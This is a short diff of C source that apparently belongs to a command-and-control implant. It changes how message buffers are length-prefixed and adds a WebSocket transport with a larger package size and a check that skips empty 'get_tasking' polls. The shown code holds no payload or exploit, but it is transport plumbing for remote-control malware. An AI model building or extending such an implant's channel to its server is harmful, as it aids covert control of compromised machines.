@@ -98,26 +98,19 @@ BOOL PackageAddInt64(PPackage package, UINT64 value)
 
 BOOL PackageAddBytes(PPackage package, PBYTE data, SIZE_T size, BOOL copySize)
 {
-    if (copySize && size)
+    if (copySize)
     {
-        if (!PackageAddInt32(package, size))
+        if (!PackageAddInt32(package, (UINT32)size))
             return FALSE;
     }
 
     if (size)
     {
-        // Reallocate the size of package->buffer + size of new data
         package->buffer = LocalReAlloc(package->buffer, package->length + size, LMEM_MOVEABLE | LMEM_ZEROINIT);
         if (!package->buffer)
             return FALSE;
 
-        if (copySize)
-            addInt32ToBuffer((PBYTE)package->buffer + (package->length - sizeof(UINT32)), size);
-
-        // Copy new data to end of package->buffer
         memcpy((PBYTE)package->buffer + package->length, data, size);
-
-        // Adjust package size accordingly
         package->length += size;
     }
 
@@ -439,6 +432,9 @@ BOOL PackageSendAll(PPARSER response)
 #ifdef TCP_TRANSPORT
     #define MAX_PACKAGE_SIZE (PIPE_BUFFER_MAX * 3 / 4)     // ~48 KB
 #endif
+#ifdef WEBSOCKET_TRANSPORT
+    #define MAX_PACKAGE_SIZE (MAX_REQUEST_LENGTH * 3 / 4)  // ~2.25MB
+#endif
 
     _dbg("Sending All Queued Packages to Server ...");
 
@@ -460,6 +456,13 @@ BOOL PackageSendAll(PPARSER response)
 #ifdef TCP_TRANSPORT
 
     /* Nothing to send */
+    if ( !xenonConfig->PackageQueue )
+        return TRUE;
+
+#endif
+#ifdef WEBSOCKET_TRANSPORT
+
+    /* Push: never send empty get_tasking polls */
     if ( !xenonConfig->PackageQueue )
         return TRUE;
 
